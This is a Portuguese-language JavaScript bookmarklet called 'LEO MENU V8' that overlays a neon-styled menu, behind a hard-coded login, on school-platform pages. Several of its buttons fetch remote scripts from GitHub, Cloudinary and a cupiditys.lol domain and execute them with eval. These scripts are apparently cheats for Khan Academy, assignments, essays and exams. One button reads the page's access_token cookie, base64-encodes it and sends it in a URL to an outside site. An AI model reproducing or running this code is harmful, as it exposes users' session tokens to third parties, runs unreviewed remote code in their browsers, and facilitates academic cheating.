javascript:(() => {
const style = document.createElement("style");
style.innerHTML = `
/* ===== animações e estilos ===== */
@keyframes glowYellowNeon {0% { box-shadow: 0 0 8px #ffff00, 0 0 15px #ffff55; }50% { box-shadow: 0 0 20px #ffff00, 0 0 30px #ffff55; }100% { box-shadow: 0 0 8px #ffff00, 0 0 15px #ffff55; }}
@keyframes rgbBorder {0%,100% { border-color: #00ffcc; box-shadow: 0 0 15px #00ffcc; }33% { border-color: #00ffee; box-shadow: 0 0 15px #00ffee; }66% { border-color: #00aaff; box-shadow: 0 0 15px #00aaff; }}
@keyframes glowBlackNeon {0% { box-shadow: 0 0 6px #000000, 0 0 12px #222222; }50% { box-shadow: 0 0 15px #000000, 0 0 25px #222222; }100% { box-shadow: 0 0 6px #000000, 0 0 12px #222222; }}
@keyframes glowTitle {0% { text-shadow: 0 0 5px #00ffcc, 0 0 10px #00ffee; }50% { text-shadow: 0 0 20px #00aaff, 0 0 40px #00ffcc; }100% { text-shadow: 0 0 5px #00ffcc, 0 0 10px #00ffee; }}
@keyframes fadeInOut {0% { opacity: 0; } 10% { opacity: 1; } 90% { opacity: 1; } 100% { opacity: 0; }}

/* ===== Botões ===== */
.rgb-button { background: linear-gradient(45deg, #000000, #222222); color: #00ffcc; border: 2px solid #00ffcc; padding: 12px 15px; margin: 10px 0; font-weight: bold; border-radius: 10px; cursor: pointer; animation: glowYellowNeon 1.5s infinite alternate; width: 100%; box-sizing: border-box; font-size: 16px; transition: background 0.3s ease; text-shadow: 0 0 5px #00ffcc; }
.rgb-button:hover { filter: brightness(1.3); background: linear-gradient(45deg, #111111, #333333); }

.rgb-fechar-x { position: absolute; top: 8px; right: 12px; color: #00ffcc; font-weight: bold; font-size: 18px; cursor: pointer; text-shadow: 0 0 6px #00ffcc; z-index: 3; }

.flutuante { position: fixed; bottom: 80px; right: 20px; width: 50px; height: 50px; background: url('https://rlv.zcache.com.br/adesivo_redondo_hacker_branco_para_cyber_warrior_e_hacker_etico-r55132c8aa48c4a079f06c6a434d98635_zg2qos_166.jpg?rlvnet=1') no-repeat center center; background-size: cover; border-radius: 50%; box-shadow: 0 0 20px #00ffcc, 0 0 35px #00ffee; z-index: 9999; cursor: pointer; animation: glowYellowNeon 2s infinite alternate; display: flex; align-items: center; justify-content: center; user-select: none; font-weight: bold; font-size: 24px; color: #00ffcc; text-shadow: 0 0 10px #00ffcc; }
@media(max-width:600px) { .flutuante { width: 45px; height: 45px; font-size: 18px; } .rgb-button { font-size: 14px; padding: 10px; } }

.aviso-texto { margin-top: 15px; background: rgba(0,0,0,0.7); border: 2px solid #00ffcc; border-radius: 10px; padding: 10px; font-size: 14px; color: #00ffcc; font-weight: bold; text-align: center; white-space: pre-line; user-select: none; animation: glowYellowNeon 3s infinite alternate; text-shadow: 0 0 8px #00ffcc; }

#bobMenu { position: fixed; top: 100px; left: 10px; width: 360px; aspect-ratio: 3/4; overflow-y: auto; border: 2px solid #00ffcc; border-radius: 15px; padding: 20px 20px 25px 20px; font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif; color: #00ffcc; box-shadow: 0 0 20px rgba(0,255,204,0.7); animation: glowYellowNeon 1s infinite alternate; user-select: none; z-index: 9999; background: url('https://conteudo.imguol.com.br/c/parceiros/90/2021/10/12/ghostface-esta-de-volta-em-violento-trailer-de-panico-5-1634045872054_v2_3x4.jpg') no-repeat center center; background-size: contain; background-color: #000; }
#bobMenu h3 { position: relative; z-index: 2; color: #00ffcc; font-size: 22px; margin-bottom: 15px; display: flex; align-items: center; justify-content: center; gap: 8px; font-weight: bolder; font-family: 'Segoe UI Black', Tahoma, Geneva, Verdana, sans-serif; animation: glowTitle 2s infinite alternate; }
#bobMenu button { position: relative; z-index: 2; }

/* ===== Login ===== */
#loginOverlay { position: fixed; inset: 0; background: rgba(0,0,0,0.85); display: flex; justify-content: center; align-items: center; z-index: 10000; user-select: none; }
#loginBox { position: relative; width: 340px; max-width: calc(100% - 40px); min-height: 500px; border-radius: 15px; overflow-y: auto; box-shadow: 0 0 25px #00ffcc; font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif; color: #00ffcc; text-align: center; cursor: default; border: 4px solid; animation: rgbBorder 6s linear infinite; box-sizing: border-box; display: flex; flex-direction: column; align-items: center; padding: 20px; }
#loginBox img.loginBg { position: absolute; inset: 0; width: 100%; height: 100%; object-fit: cover; filter: brightness(0.85); z-index: 1; }
#loginContent { position: relative; z-index: 2; padding: 28px 24px; display: flex; flex-direction: column; justify-content: center; width: 100%; gap: 10px; }
#loginContent h2 { margin-bottom: 12px; font-weight: bolder; text-shadow: 0 0 10px #00ffcc; }
#loginContent input { width: 100%; max-width: 100%; box-sizing: border-box; display: block; padding: 14px 12px; margin: 8px 0 14px 0; border-radius: 8px; border: 2px solid #00ffcc; background: #000; color: #00ffcc; font-size: 16px; outline: none; box-shadow: inset 0 0 8px #00ffcc; }
#loginContent input:focus { border-color: #00ffee; box-shadow: 0 0 12px #00ffee; }
#loginContent button { background: linear-gradient(45deg, #00ffcc, #00aaff); border: none; color: #000; font-weight: bold; font-size: 18px; padding: 12px; border-radius: 10px; cursor: pointer; text-shadow: 0 0 5px #00ffcc; }
#loginContent button:hover { background: linear-gradient(45deg, #00aaff, #0088aa); }
#loginError { color: #ff4c4c; font-weight: bold; margin-bottom: 10px; display: none; text-shadow: 0 0 5px #ff4c4c; }
#welcomeMessage, #creditsMessage { position: fixed; top: 30%; left: 50%; transform: translate(-50%, -50%); background: linear-gradient(135deg, #000000, #111111); color: #00ffcc; font-size: 26px; font-weight: 900; padding: 30px 40px; border-radius: 15px; box-shadow: 0 0 30px #00ffcc; text-align: center; font-family: 'Segoe UI Black', Tahoma, Geneva, Verdana, sans-serif; z-index: 10001; user-select: none; opacity: 0; animation: fadeInOut 4s forwards; }
#donateBtn { animation: glowBlackNeon 2s infinite alternate; }
`;
document.head.appendChild(style);

let loggedIn = false;

const criarMenu = () => {
  if(document.getElementById("bobMenu")) return;
  const e = document.createElement("div");
  e.id = "bobMenu";
  e.innerHTML = `<div class="rgb-fechar-x" onclick="this.parentNode.remove()">✖</div><h3>LEO MENU V8</h3>`;
  document.body.appendChild(e);
  const addButton = (txt, func) => { const b=document.createElement("button"); b.innerText=txt; b.className="rgb-button"; if(func) b.onclick=func; e.appendChild(b); };

  addButton("📚 KHAN ACADEMY", ()=>{fetch("https://raw.githubusercontent.com/Niximkk/Khanware/refs/heads/main/Khanware.js").then(r=>r.text()).then(eval)});
  addButton("✅ TAREFA HACK V.10", ()=>{window.open("https://taskitos.cupiditys.lol/","_blank")});
  addButton("📝 REDAÇÃO HACK", ()=>{window.open("https://redacao.cupiditys.lol/","_blank")});
  addButton("📖 LEIA SP HACK V.7", ()=>{try{const token=document.cookie.split('access_token=')[1].split(';')[0]; const encoded=encodeURIComponent(btoa(token)); window.open(`https://leiasp.cupiditys.lol/?key=${encoded}`,"_blank")}catch{alert("❌ Token não encontrado.")}});
  addButton("📌 KHAN AUTOMÁTICO v.1", ()=>{fetch("https://raw.githubusercontent.com/Snowxyrzk/Khan-Destroyer/refs/heads/main/SCRIPT.js").then(t=>t.text()).then(eval)});
  addButton("📚 Geografia e História - Volume 3", ()=>{window.open("https://acervocmsp.educacao.sp.gov.br/138038/1262582.pdf","_blank")});
  addButton("📚 Matemática e Português - Volume 3", ()=>{window.open("https://acervocmsp.educacao.sp.gov.br/138013/1262487.pdf","_blank")});
  addButton("📚 Física, Biologia, Química - Volume 3", ()=>{window.open("https://acervocmsp.educacao.sp.gov.br/138040/1262595.pdf","_blank")});
  addButton("🎤 SPEAK V2 MOD", ()=>{ fetch('https://speakify.cupiditys.lol/api/bookmark.js').then(r=>r.text()).then(eval).catch(()=>alert("❌ Erro ao carregar SPEAK V2 MOD.")) });
  addButton("☠️ MOD PROVA", ()=>{fetch('https://res.cloudinary.com/dctxcezsd/raw/upload/v1745012111/saladofuturo.js').then(t=>t.text()).then(eval)});
  const aviso=document.createElement("div"); aviso.className="aviso-texto"; aviso.innerText="⚠️ Use com responsabilidade!\nLEO MENU V8 - VIP"; e.appendChild(aviso);
  mostrarCreditos();
};

const mostrarMensagemBoasVindas=()=>{const msg=document.createElement("div"); msg.id="welcomeMessage"; msg.innerText="🎉 Bem-vindo, LEO! 🎉"; document.body.appendChild(msg); setTimeout(()=>{msg.remove();},4000);}
const mostrarCreditos=()=>{const c=document.createElement("div"); c.id="creditsMessage"; c.innerText="💻 Mod Menu VIP por Leonardo F.G 💻"; document.body.appendChild(c); setTimeout(()=>{c.remove();},4000);}

const criarLogin=()=>{ 
  if(document.getElementById("loginOverlay")) return;
  const overlay=document.createElement("div"); overlay.id="loginOverlay";
  overlay.innerHTML=`<div id="loginBox"><img class="loginBg" src="https://i1.sndcdn.com/artworks-000675977329-iemtt0-t500x500.jpg"/><div id="loginContent"><h2>Login</h2><div id="loginError">Usuário ou senha incorretos!</div><input type="text" id="loginUser" placeholder="Usuário"/><input type="password" id="loginPass" placeholder="Senha"/><button id="loginBtn">Entrar</button><button id="donateBtn">💖 Apoiar o Criador / Doar</button></div></div>`;
  document.body.appendChild(overlay);

  document.getElementById("loginBtn").onclick=()=>{const user=document.getElementById("loginUser").value.trim(); const pass=document.getElementById("loginPass").value.trim(); if(user==="LEO" && pass==="VIP"){overlay.remove(); loggedIn=true; mostrarMensagemBoasVindas(); criarMenu();} else document.getElementById("loginError").style.display="block";};
  document.getElementById("donateBtn").onclick=()=>window.open("https://pixgg.com/LEO_MODS_OFC","_blank");

  overlay.querySelectorAll("input").forEach(input=>input.addEventListener("keydown", e=>{if(e.key==="Enter") document.getElementById("loginBtn").click();}));
};

const botaoFlutuante=document.createElement("div"); botaoFlutuante.className="flutuante"; botaoFlutuante.title="Abrir LEO MENU V8"; botaoFlutuante.onclick=()=>loggedIn?criarMenu():criarLogin(); document.body.appendChild(botaoFlutuante);

criarLogin();
})();
